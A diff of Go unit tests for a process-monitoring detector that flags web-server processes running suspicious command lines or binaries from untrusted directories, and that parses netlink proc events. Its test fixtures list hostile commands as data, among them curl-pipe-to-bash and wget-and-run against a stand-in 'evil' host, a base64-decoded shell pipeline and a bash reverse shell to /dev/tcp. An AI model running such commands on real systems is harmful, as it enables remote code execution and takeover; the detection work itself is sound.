@@ -5,62 +5,156 @@ import (
 	"testing"
 )
 
-func TestScoreProcessWebServerStartingAShell(t *testing.T) {
-	f := scoreProcess("php-fpm", "bash", "/usr/bin/bash", 1000)
-	if f.score != procWebShellScore || f.code != reasonWebShell {
-		t.Fatalf("web->shell: got %+v", f)
+// A legitimate shell-out carries no download-and-run indicator, so it must not
+// fire. This is the FP2 showstopper regression: the first model scored
+// php-fpm -> sh, and PHP mail() runs popen("/bin/sh -c sendmail") on every mail.
+func TestScoreProcessLegitimateShellOut(t *testing.T) {
+	cases := []string{
+		"sh -c /usr/sbin/sendmail -t -i",
+		"sh -c mysqldump database",
+		"sh -c /usr/bin/convert a.png b.jpg",
 	}
-	if f.parent != "php-fpm" || f.child != "bash" {
-		t.Fatalf("web->shell chain not carried: %+v", f)
+	for _, cl := range cases {
+		if f := scoreProcess(true, "/bin/sh", cl, 1000); f.score != 0 {
+			t.Fatalf("legitimate shell-out fired: %q -> %+v", cl, f)
+		}
 	}
-}
-
-func TestScoreProcessWebServerStartingADownloader(t *testing.T) {
-	f := scoreProcess("nginx", "curl", "/usr/bin/curl", 1000)
-	if f.score != procDownloaderScore || f.code != reasonWebDownloader {
-		t.Fatalf("web->downloader: got %+v", f)
-	}
-	// A downloader alone is below the reporting threshold: real signal, not an
-	// alert on its own.
-	if f.score >= procScoreSuspicious {
-		t.Fatalf("a downloader should score below the reporting threshold, got %d", f.score)
+	if f := scoreProcess(true, "/usr/bin/php", "php /home/c_x/public_html/index.php", 1000); f.score != 0 {
+		t.Fatalf("a legitimate php run fired: %+v", f)
 	}
 }
 
-func TestScoreProcessWorldWritableExecutable(t *testing.T) {
-	f := scoreProcess("bash", "evil", "/tmp/evil", 1000)
-	if f.score != procWorldWritableScore || f.code != reasonWorldWritable {
-		t.Fatalf("world-writable: got %+v", f)
+// A web process running a shell/interpreter with a download-and-run,
+// reverse-shell or obfuscation command line is critical.
+func TestScoreProcessMaliciousCmdline(t *testing.T) {
+	type c struct{ exe, cl string }
+	cases := []c{
+		{"/bin/bash", "sh -c curl http://evil/x|bash"},
+		{"/bin/bash", "bash -c wget http://evil/s -O /tmp/s; chmod +x /tmp/s"},
+		{"/bin/sh", "sh -c echo payload | base64 -d | sh"},
+		{"/usr/bin/php", "php -r eval(hexdec($x))"},
+		{"/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
 	}
-	if f.dir != "/tmp" {
-		t.Fatalf("world-writable dir should be the category /tmp, got %q", f.dir)
-	}
-}
-
-func TestScoreProcessRootShellIsNormal(t *testing.T) {
-	// A shell whose parent is not a web process is ordinary (cron, an admin).
-	if f := scoreProcess("cron", "bash", "/usr/bin/bash", 0); f.score != 0 {
-		t.Fatalf("a non-web parent starting a shell should not fire: %+v", f)
-	}
-}
-
-func TestScoreProcessLegitimateWebChildIsNormal(t *testing.T) {
-	if f := scoreProcess("php-fpm", "php-fpm", "/usr/sbin/php-fpm", 1000); f.score != 0 {
-		t.Fatalf("php-fpm managing its own workers should not fire: %+v", f)
+	for _, x := range cases {
+		if f := scoreProcess(true, x.exe, x.cl, 1000); f.score < procScoreCritical || f.code != reasonWebShellCmd {
+			t.Fatalf("malicious cmdline not caught: %q -> %+v", x.cl, f)
+		}
 	}
 }
 
-func TestScoreProcessWorldWritableNeedsTenantOrWeb(t *testing.T) {
-	// A root process (uid 0) that is not a web server running from /tmp is not
-	// reported: system tooling legitimately does this.
-	if f := scoreProcess("systemd", "helper", "/tmp/helper", 0); f.score != 0 {
-		t.Fatalf("a root /tmp exec with no web parent should not fire: %+v", f)
+// An untrusted origin (document root, volatile dir, memfd, deleted) is critical
+// whatever the binary is named, so renaming a shell or dropping an ELF does not
+// evade it.
+func TestScoreProcessUntrustedOrigin(t *testing.T) {
+	cases := map[string]string{
+		"/home/c_x/public_html/.hidden": "public_html",
+		"/tmp/a.out":                    "tmp",
+		"/dev/shm/x":                    "shm",
+		"/var/tmp/y":                    "var_tmp",
+		"/memfd:stage (deleted)":        "memfd",
+		"/usr/bin/python3 (deleted)":    "deleted",
+	}
+	for exe, wantCat := range cases {
+		f := scoreProcess(true, exe, "", 1000)
+		if f.score < procScoreCritical || f.code != reasonUntrustedOrigin {
+			t.Fatalf("untrusted origin not caught: %q -> %+v", exe, f)
+		}
+		if f.category != wantCat {
+			t.Fatalf("untrusted origin %q: category %q, want %q", exe, f.category, wantCat)
+		}
+	}
+}
+
+// A web process running a downloader against a remote URL is a warning (35),
+// between the reporting threshold and critical.
+func TestScoreProcessWebDownloader(t *testing.T) {
+	f := scoreProcess(true, "/usr/bin/curl", "curl -s http://evil/x", 1000)
+	if f.score != procScoreDownloader || f.code != reasonWebDownloader {
+		t.Fatalf("web downloader: got %+v", f)
+	}
+	if f.score >= procScoreCritical {
+		t.Fatalf("a remote download should be a warning, not critical: %d", f.score)
+	}
+}
+
+// A non-web context does not fire: a tenant running a shell from their own SSH
+// session is their own business.
+func TestScoreProcessNotWeb(t *testing.T) {
+	if f := scoreProcess(false, "/bin/bash", "bash -c curl http://x|bash", 0); f.score != 0 {
+		t.Fatalf("a non-web context fired: %+v", f)
+	}
+}
+
+// Servika-specific: internal/apps runs a tenant's own dependency binary from
+// /home/<user>/<app>/.venv/bin or node_modules/.bin. A blanket /home
+// untrusted-origin rule would flag every panel-created Node or Python app. The
+// document root is the only untrusted part of /home.
+func TestScoreProcessLegitimateAppBinaryIsNotUntrusted(t *testing.T) {
+	cases := []string{
+		"/home/c_x/app/.venv/bin/gunicorn",
+		"/home/c_x/app/node_modules/.bin/next",
+		"/home/c_x/api/.venv/bin/uvicorn",
+	}
+	for _, exe := range cases {
+		if f := scoreProcess(true, exe, "gunicorn -w 4 app:app", 1000); f.score != 0 {
+			t.Fatalf("a legitimate app binary was flagged: %q -> %+v", exe, f)
+		}
+	}
+}
+
+func TestOriginCategory(t *testing.T) {
+	yes := map[string]string{
+		"/tmp/x":                  "tmp",
+		"/dev/shm/y":              "shm",
+		"/var/tmp/z":              "var_tmp",
+		"/home/c_x/public_html/a": "public_html",
+		"/memfd:x":                "memfd",
+		"/usr/bin/x (deleted)":    "deleted",
+	}
+	for exe, want := range yes {
+		if got := originCategory(exe); got != want {
+			t.Fatalf("originCategory(%q) = %q, want %q", exe, got, want)
+		}
+	}
+	no := []string{
+		"/usr/bin/curl", "/bin/bash", "/opt/app/bin/x", "/usr/local/bin/y",
+		"/home/c_x/app/.venv/bin/gunicorn", "/home/c_x/api/node_modules/.bin/next",
+	}
+	for _, exe := range no {
+		if got := originCategory(exe); got != "" {
+			t.Fatalf("originCategory(%q) = %q, want legitimate", exe, got)
+		}
+	}
+}
+
+func TestCmdlineSuspicious(t *testing.T) {
+	if !cmdlineSuspicious("sh -c curl http://x|bash") {
+		t.Fatal("curl|bash missed")
+	}
+	if !cmdlineSuspicious("echo x | base64 -d") {
+		t.Fatal("base64 -d missed")
+	}
+	if cmdlineSuspicious("/usr/sbin/sendmail -t -i") {
+		t.Fatal("sendmail flagged (FP2)")
+	}
+	if cmdlineSuspicious("mysqldump database > backup.sql") {
+		t.Fatal("mysqldump flagged")
+	}
+}
+
+func TestIsWebServer(t *testing.T) {
+	if !isWebServer("/usr/sbin/php-fpm", "php-fpm") {
+		t.Fatal("php-fpm not classified as web")
+	}
+	if !isWebServer("/usr/sbin/nginx", "nginx") {
+		t.Fatal("nginx not classified as web")
+	}
+	if isWebServer("/bin/bash", "bash") {
+		t.Fatal("bash classified as web")
 	}
 }
 
 func TestParseStatHandlesCommWithSpacesAndParens(t *testing.T) {
-	// comm can itself contain spaces and parentheses; the fields after the LAST
-	// ')' are state, ppid, ...
 	ppid, comm := parseStat("1234 ((evil) proc) S 42 100 100 0 -1")
 	if comm != "(evil) proc" {
 		t.Fatalf("comm parse trap: got %q", comm)
@@ -70,43 +164,48 @@ func TestParseStatHandlesCommWithSpacesAndParens(t *testing.T) {
 	}
 }
 
-func TestParseStatSimple(t *testing.T) {
-	ppid, comm := parseStat("77 (bash) R 55 77 77 0")
-	if comm != "bash" || ppid != 55 {
-		t.Fatalf("got comm=%q ppid=%d", comm, ppid)
-	}
-}
-
-// buildExecEvent builds a netlink connector message carrying one EXEC event for
-// pid. Layout: nlmsghdr(16) + cn_msg(20) + proc_event{what(4) cpu(4) ts(8) =16 +
-// process_pid(4)}. `what` is at payload offset 20, process_pid at payload 36.
-func buildExecEvent(pid int32, what uint32) []byte {
-	const total = 64
+// buildEvent builds a netlink connector message for one proc event. Layout:
+// nlmsghdr(16) + cn_msg{ id.idx(4) id.val(4) seq(4) ack(4) len(2) flags(2) } +
+// proc_event{ what(4) cpu(4) ts(8) } + event_data. The connector id is set
+// because parseProcEvents validates it.
+func buildEvent(what uint32, a, b int32) []byte {
+	const total = 16 + 20 + 16 + 16
 	buf := make([]byte, total)
-	binary.LittleEndian.PutUint32(buf[0:], total) // nlmsg_len
-	binary.LittleEndian.PutUint32(buf[16+20:], what)
-	binary.LittleEndian.PutUint32(buf[16+36:], uint32(pid))
+	binary.LittleEndian.PutUint32(buf[0:], total)      // nlmsg_len
+	binary.LittleEndian.PutUint32(buf[16:], cnIdxProc) // cn_msg.id.idx
+	binary.LittleEndian.PutUint32(buf[20:], cnValProc) // cn_msg.id.val
+	binary.LittleEndian.PutUint32(buf[36:], what)      // proc_event.what
+	binary.LittleEndian.PutUint32(buf[52:], uint32(a)) // event_data[0]
+	binary.LittleEndian.PutUint32(buf[60:], uint32(b)) // event_data[8]
 	return buf
 }
 
-func TestExecPIDsExtractsExecEvents(t *testing.T) {
-	pids := execPIDs(buildExecEvent(4321, procEventExec))
-	if len(pids) != 1 || pids[0] != 4321 {
-		t.Fatalf("exec event pid: got %v", pids)
+func TestParseProcEventsExec(t *testing.T) {
+	evs := parseProcEvents(buildEvent(procEventExec, 4242, 0))
+	if len(evs) != 1 || evs[0].kind != procEventExec || evs[0].pid != 4242 {
+		t.Fatalf("exec event: %+v", evs)
 	}
 }
 
-func TestExecPIDsIgnoresNonExecEvents(t *testing.T) {
-	// A non-EXEC event (e.g. fork = 0x1) yields no pid.
-	if pids := execPIDs(buildExecEvent(4321, 0x1)); len(pids) != 0 {
-		t.Fatalf("a non-exec event produced pids: %v", pids)
+func TestParseProcEventsFork(t *testing.T) {
+	evs := parseProcEvents(buildEvent(procEventFork, 100, 200))
+	if len(evs) != 1 || evs[0].kind != procEventFork || evs[0].pid != 200 || evs[0].parent != 100 {
+		t.Fatalf("fork event: %+v", evs)
 	}
 }
 
-func TestExecPIDsStopsOnAMalformedLength(t *testing.T) {
-	buf := buildExecEvent(4321, procEventExec)
+func TestParseProcEventsRejectsForeignConnector(t *testing.T) {
+	buf := buildEvent(procEventExec, 4242, 0)
+	binary.LittleEndian.PutUint32(buf[16:], 0x99) // wrong cn_msg.id.idx
+	if evs := parseProcEvents(buf); len(evs) != 0 {
+		t.Fatalf("a foreign connector id should yield nothing, got %+v", evs)
+	}
+}
+
+func TestParseProcEventsStopsOnMalformedLength(t *testing.T) {
+	buf := buildEvent(procEventExec, 4242, 0)
 	binary.LittleEndian.PutUint32(buf[0:], 8) // nlLen < 16, must stop
-	if pids := execPIDs(buf); len(pids) != 0 {
-		t.Fatalf("a malformed length should yield nothing, got %v", pids)
+	if evs := parseProcEvents(buf); len(evs) != 0 {
+		t.Fatalf("a malformed length should yield nothing, got %+v", evs)
 	}
 }
